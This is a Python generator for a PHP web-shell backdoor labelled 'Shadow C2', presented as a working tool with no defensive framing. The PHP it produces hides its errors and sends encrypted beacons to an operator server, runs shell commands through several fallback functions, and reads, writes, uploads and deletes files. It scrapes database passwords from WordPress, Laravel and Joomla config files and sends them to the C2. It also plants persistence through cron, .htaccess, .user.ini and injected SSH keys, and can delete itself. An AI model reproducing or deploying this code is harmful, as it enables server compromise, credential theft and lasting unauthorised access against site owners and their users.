#!/usr/bin/env python3
"""
Shadow C2 — PHP Raw Payload Template
The main backdoor: C2 registration, beacon loop, command execution,
file operations, credential finder, persistence installer.
"""

import random
import base64


class PHPRawTemplate:
    """Generate complete PHP backdoor code."""

    def generate(self, c2_url: str, encryption_key: str,
                 features: list = None) -> str:
        """
        Generate complete PHP backdoor.
        features: list of enabled features:
          'exec', 'files', 'creds', 'persist', 'selfdestruct'
        """
        if features is None:
            features = ["exec", "files", "creds", "persist"]

        uuid_var = f"$_uid_{random.randint(100,999)}"
        key_var = f"$_ek_{random.randint(100,999)}"

        code = f"""<?php
@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('max_execution_time', '0');
@set_time_limit(0);
@ini_set('memory_limit', '-1');

// ===== CONFIGURATION =====
{uuid_var} = '';
{key_var} = '{encryption_key}';
$_c2 = '{c2_url}';
$_beacon_interval = 30;
$_session_file = sys_get_temp_dir() . '/.sess_' . md5(__FILE__);

// ===== CRYPTO HELPERS =====
function _xenc($data, $key) {{
    $r = '';
    $kl = strlen($key);
    for($i = 0; $i < strlen($data); $i++) {{
        $r .= chr(ord($data[$i]) ^ ord($key[$i % $kl]));
    }}
    return base64_encode($r);
}}

function _xdec($data, $key) {{
    $data = base64_decode($data);
    $r = '';
    $kl = strlen($key);
    for($i = 0; $i < strlen($data); $i++) {{
        $r .= chr(ord($data[$i]) ^ ord($key[$i % $kl]));
    }}
    return $r;
}}

// AES if available
function _aenc($data, $key) {{
    if(function_exists('openssl_encrypt')) {{
        $iv = openssl_random_pseudo_bytes(16);
        $ct = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $ct);
    }}
    return _xenc($data, $key);
}}

function _adec($data, $key) {{
    if(function_exists('openssl_decrypt')) {{
        $raw = base64_decode($data);
        $iv = substr($raw, 0, 16);
        $ct = substr($raw, 16);
        return openssl_decrypt($ct, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    }}
    return _xdec($data, $key);
}}

// ===== HTTP COMMUNICATION =====
function _http($url, $data = null, $method = 'POST') {{
    $ua_pool = array(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
    );

    $headers = array(
        'Content-Type: application/json',
        'User-Agent: ' . $ua_pool[array_rand($ua_pool)],
        'Accept: text/html,application/json,*/*',
        'Accept-Language: en-US,en;q=0.9',
        'X-Request-ID: ' . rand(100000, 999999),
        'Cache-Control: no-cache'
    );

    if(function_exists('curl_init')) {{
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        if($data !== null) {{
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }}
        $resp = curl_exec($ch);
        curl_close($ch);
        return $resp;
    }}

    // Fallback: file_get_contents with stream context
    $opts = array('http' => array(
        'method' => $method,
        'header' => implode("\\r\\n", $headers),
        'content' => $data,
        'timeout' => 30,
        'ignore_errors' => true
    ), 'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
    ));
    $ctx = stream_context_create($opts);
    return @file_get_contents($url, false, $ctx);
}}

// ===== SYSTEM INFO =====
function _sysinfo() {{
    $info = array(
        'hostname' => @gethostname(),
        'os' => PHP_OS,
        'arch' => php_uname('m'),
        'php_version' => PHP_VERSION,
        'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
        'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
        'ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '',
        'disabled_functions' => @ini_get('disable_functions'),
        'writable_dirs' => '',
        'cms_detected' => '',
        'waf_detected' => ''
    );

    // Find writable directories
    $check_dirs = array('/tmp', '/var/tmp', sys_get_temp_dir(), @getcwd());
    if(isset($_SERVER['DOCUMENT_ROOT'])) $check_dirs[] = $_SERVER['DOCUMENT_ROOT'];
    $writable = array();
    foreach($check_dirs as $d) {{
        if(@is_writable($d)) $writable[] = $d;
    }}
    $info['writable_dirs'] = implode(',', $writable);

    // CMS detection
    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    if(@file_exists($doc_root . '/wp-config.php')) $info['cms_detected'] = 'WordPress';
    elseif(@file_exists($doc_root . '/configuration.php')) $info['cms_detected'] = 'Joomla';
    elseif(@file_exists($doc_root . '/sites/default/settings.php')) $info['cms_detected'] = 'Drupal';

    return $info;
}}

// ===== COMMAND EXECUTION =====
"""
        if "exec" in features:
            code += """
function _exec($cmd) {
    $output = '';

    // Try multiple execution methods with fallback chain
    $methods = array('system', 'exec', 'shell_exec', 'passthru',
                     'popen', 'proc_open');
    $disabled = explode(',', @ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);

    foreach($methods as $m) {
        if(in_array($m, $disabled)) continue;

        switch($m) {
            case 'system':
                ob_start();
                @system($cmd);
                $output = ob_get_clean();
                if($output !== '') return $output;
                break;

            case 'exec':
                $lines = array();
                @exec($cmd, $lines);
                $output = implode("\\n", $lines);
                if($output !== '') return $output;
                break;

            case 'shell_exec':
                $output = @shell_exec($cmd);
                if($output !== null) return $output;
                break;

            case 'passthru':
                ob_start();
                @passthru($cmd);
                $output = ob_get_clean();
                if($output !== '') return $output;
                break;

            case 'popen':
                $fp = @popen($cmd, 'r');
                if($fp) {
                    $output = @fread($fp, 1048576);
                    @pclose($fp);
                    if($output !== '') return $output;
                }
                break;

            case 'proc_open':
                $desc = array(
                    0 => array('pipe', 'r'),
                    1 => array('pipe', 'w'),
                    2 => array('pipe', 'w')
                );
                $proc = @proc_open($cmd, $desc, $pipes);
                if(is_resource($proc)) {
                    @fclose($pipes[0]);
                    $output = @stream_get_contents($pipes[1]);
                    @fclose($pipes[1]);
                    @fclose($pipes[2]);
                    @proc_close($proc);
                    if($output !== '') return $output;
                }
                break;
        }
    }

    // Last resort: backtick operator
    if(!in_array('exec', $disabled)) {
        $output = `$cmd`;
        if($output !== null) return $output;
    }

    return '[!] All execution methods blocked';
}
"""

        if "files" in features:
            code += """
// ===== FILE OPERATIONS =====
function _ls($path) {
    $result = array();
    $items = @scandir($path);
    if(!$items) return 'Cannot read directory';
    foreach($items as $item) {
        if($item === '.' || $item === '..') continue;
        $full = $path . '/' . $item;
        $info = array(
            'name' => $item,
            'type' => is_dir($full) ? 'd' : 'f',
            'size' => @filesize($full),
            'perms' => substr(sprintf('%o', @fileperms($full)), -4),
            'modified' => @date('Y-m-d H:i:s', @filemtime($full))
        );
        $result[] = $info;
    }
    return json_encode($result);
}

function _read($path) {
    if(!@is_readable($path)) return '[!] Cannot read file';
    return @file_get_contents($path);
}

function _write($path, $content) {
    $bytes = @file_put_contents($path, $content);
    return $bytes !== false ? "[+] Written $bytes bytes" : '[!] Write failed';
}

function _del($path) {
    if(@is_dir($path)) {
        return @rmdir($path) ? '[+] Directory removed' : '[!] Cannot remove';
    }
    return @unlink($path) ? '[+] File deleted' : '[!] Cannot delete';
}
"""

        if "creds" in features:
            code += """
// ===== CREDENTIAL FINDER =====
function _findcreds() {
    $creds = array();
    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '/var/www';

    // WordPress
    $wp_config = $doc_root . '/wp-config.php';
    if(@is_readable($wp_config)) {
        $content = @file_get_contents($wp_config);
        preg_match("/define\\s*\\(\\s*'DB_NAME'\\s*,\\s*'([^']+)'/", $content, $m);
        $db_name = isset($m[1]) ? $m[1] : '';
        preg_match("/define\\s*\\(\\s*'DB_USER'\\s*,\\s*'([^']+)'/", $content, $m);
        $db_user = isset($m[1]) ? $m[1] : '';
        preg_match("/define\\s*\\(\\s*'DB_PASSWORD'\\s*,\\s*'([^']+)'/", $content, $m);
        $db_pass = isset($m[1]) ? $m[1] : '';
        preg_match("/define\\s*\\(\\s*'DB_HOST'\\s*,\\s*'([^']+)'/", $content, $m);
        $db_host = isset($m[1]) ? $m[1] : 'localhost';
        if($db_user) {
            $creds[] = array('service'=>'mysql','host'=>$db_host,'port'=>3306,
                'username'=>$db_user,'password'=>$db_pass,'database_name'=>$db_name);
        }
    }

    // .env files (Laravel, generic)
    $env_paths = array($doc_root . '/.env', $doc_root . '/../.env',
        $doc_root . '/../../.env');
    foreach($env_paths as $ep) {
        if(@is_readable($ep)) {
            $content = @file_get_contents($ep);
            preg_match('/DB_HOST=(.+)/', $content, $h);
            preg_match('/DB_DATABASE=(.+)/', $content, $d);
            preg_match('/DB_USERNAME=(.+)/', $content, $u);
            preg_match('/DB_PASSWORD=(.+)/', $content, $p);
            if(isset($u[1]) && trim($u[1])) {
                $creds[] = array('service'=>'mysql',
                    'host'=>isset($h[1])?trim($h[1]):'localhost',
                    'port'=>3306,
                    'username'=>trim($u[1]),
                    'password'=>isset($p[1])?trim($p[1]):'',
                    'database_name'=>isset($d[1])?trim($d[1]):'');
            }
        }
    }

    // Joomla configuration.php
    $joomla_cfg = $doc_root . '/configuration.php';
    if(@is_readable($joomla_cfg)) {
        $content = @file_get_contents($joomla_cfg);
        preg_match('/\\$host\\s*=\\s*[\'"]([^\'"]+)/', $content, $h);
        preg_match('/\\$user\\s*=\\s*[\'"]([^\'"]+)/', $content, $u);
        preg_match('/\\$password\\s*=\\s*[\'"]([^\'"]+)/', $content, $p);
        preg_match('/\\$db\\s*=\\s*[\'"]([^\'"]+)/', $content, $d);
        if(isset($u[1])) {
            $creds[] = array('service'=>'mysql',
                'host'=>isset($h[1])?$h[1]:'localhost','port'=>3306,
                'username'=>$u[1],'password'=>isset($p[1])?$p[1]:'',
                'database_name'=>isset($d[1])?$d[1]:'');
        }
    }

    return $creds;
}
"""

        if "persist" in features:
            code += """
// ===== PERSISTENCE INSTALLER =====
function _persist($method, $details = '') {
    $result = array('method' => $method, 'status' => 'failed', 'details' => '');

    switch($method) {
        case 'cron':
            $payload_url = $details ? $details : 'http://localhost' . $_SERVER['REQUEST_URI'];
            $cron_line = "*/5 * * * * curl -s '$payload_url' > /dev/null 2>&1";
            $current = @shell_exec('crontab -l 2>/dev/null');
            if(strpos($current, $payload_url) === false) {
                $new = trim($current) . "\\n" . $cron_line . "\\n";
                $tmp = tempnam(sys_get_temp_dir(), 'cr');
                @file_put_contents($tmp, $new);
                @shell_exec("crontab $tmp 2>/dev/null");
                @unlink($tmp);
                $result['status'] = 'installed';
                $result['details'] = 'Cron job added';
            }
            break;

        case 'htaccess':
            $htaccess = dirname(__FILE__) . '/.htaccess';
            $content = "AddType application/x-httpd-php .jpg .gif .png\\n";
            if(@file_put_contents($htaccess, $content, FILE_APPEND)) {
                $result['status'] = 'installed';
                $result['details'] = '.htaccess modified';
            }
            break;

        case 'userini':
            $ini = dirname(__FILE__) . '/.user.ini';
            $content = "auto_prepend_file = " . basename(__FILE__) . "\\n";
            if(@file_put_contents($ini, $content)) {
                $result['status'] = 'installed';
                $result['details'] = '.user.ini created';
            }
            break;

        case 'ssh_key':
            $home = @getenv('HOME') ?: '/root';
            $ssh_dir = $home . '/.ssh';
            @mkdir($ssh_dir, 0700, true);
            $key = $details ?: 'ssh-rsa AAAA... operator@c2';
            @file_put_contents($ssh_dir . '/authorized_keys', "\\n" . $key . "\\n", FILE_APPEND);
            @chmod($ssh_dir . '/authorized_keys', 0600);
            $result['status'] = 'installed';
            $result['details'] = 'SSH key injected';
            break;
    }

    return $result;
}
"""

        # Main execution flow
        code += f"""
// ===== MAIN EXECUTION =====
// Check if already registered
if(@file_exists($_session_file)) {{
    {uuid_var} = @trim(@file_get_contents($_session_file));
}}

// Registration
if(empty({uuid_var})) {{
    // Generate UUID
    {uuid_var} = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff),
        mt_rand(0,0x0fff) | 0x4000, mt_rand(0,0x3fff) | 0x8000,
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff));

    $info = _sysinfo();
    $info['uuid'] = {uuid_var};
"""
        if "creds" in features:
            code += """
    // Auto-find credentials on registration
    $found_creds = _findcreds();
    if(!empty($found_creds)) {
        @_http($_c2 . '/api/credentials',
            json_encode(array('uuid' => """ + uuid_var + """, 'credentials' => $found_creds)));
    }
"""
        code += f"""
    $resp = @_http($_c2 . '/api/register', json_encode($info));
    if($resp) {{
        @file_put_contents($_session_file, {uuid_var});
    }}
}}

// Process incoming request (if this is a direct C2 callback)
if(isset($_REQUEST['_action'])) {{
    $action = $_REQUEST['_action'];
    $output = '';

    switch($action) {{
"""
        if "exec" in features:
            code += """        case 'exec':
            $cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
            $output = _exec($cmd);
            break;
"""
        if "files" in features:
            code += """        case 'ls':
            $output = _ls(isset($_REQUEST['path']) ? $_REQUEST['path'] : '.');
            break;
        case 'read':
            $output = _read($_REQUEST['path']);
            break;
        case 'write':
            $output = _write($_REQUEST['path'], $_REQUEST['content']);
            break;
        case 'del':
            $output = _del($_REQUEST['path']);
            break;
        case 'upload':
            if(isset($_FILES['file'])) {
                $dest = isset($_REQUEST['path']) ? $_REQUEST['path'] : '/tmp/' . $_FILES['file']['name'];
                move_uploaded_file($_FILES['file']['tmp_name'], $dest);
                $output = "[+] Uploaded to $dest";
            }
            break;
"""
        if "persist" in features:
            code += """        case 'persist':
            $output = json_encode(_persist($_REQUEST['method'],
                isset($_REQUEST['details']) ? $_REQUEST['details'] : ''));
            break;
"""
        code += f"""        default:
            $output = 'Unknown action';
    }}
    echo _aenc($output, {key_var});
    exit;
}}

// Beacon mode (background heartbeat)
$_beacon_data = json_encode(array('uuid' => {uuid_var}, 'timestamp' => time()));
$resp = @_http($_c2 . '/api/beacon', $_beacon_data);
if($resp) {{
    $tasks = @json_decode($resp, true);
    if(isset($tasks['tasks']) && is_array($tasks['tasks'])) {{
        foreach($tasks['tasks'] as $task) {{
            $task_output = '';
            $cmd = $task['command'];

            // Handle special commands
            if(strpos($cmd, '__download__') === 0) {{
                $path = substr($cmd, 12);
                $data = @file_get_contents($path);
                if($data !== false) {{
                    // Upload file to C2
                    $boundary = '----' . md5(mt_rand());
                    $body = "--$boundary\\r\\n";
                    $body .= "Content-Disposition: form-data; name=\\"uuid\\"\\r\\n\\r\\n{uuid_var}\\r\\n";
                    $body .= "--$boundary\\r\\n";
                    $body .= "Content-Disposition: form-data; name=\\"file\\"; filename=\\"" . basename($path) . "\\"\\r\\n";
                    $body .= "Content-Type: application/octet-stream\\r\\n\\r\\n$data\\r\\n";
                    $body .= "--$boundary--\\r\\n";
                    $task_output = '[+] File sent to C2';
                }} else {{
                    $task_output = '[!] Cannot read file';
                }}
            }} else {{
                // Regular command execution
                $task_output = _exec($cmd);
            }}

            // Submit result
            @_http($_c2 . '/api/results', json_encode(array(
                'uuid' => {uuid_var},
                'task_id' => $task['id'],
                'output' => $task_output,
                'status' => 'completed'
            )));
        }}
    }}
}}
"""

        if "selfdestruct" in features:
            code += """
// Self-destruct check
if(isset($_REQUEST['_destroy'])) {
    @unlink($_session_file);
    @unlink(__FILE__);
    echo 'gone';
    exit;
}
"""

        code += "\n?>"
        return code
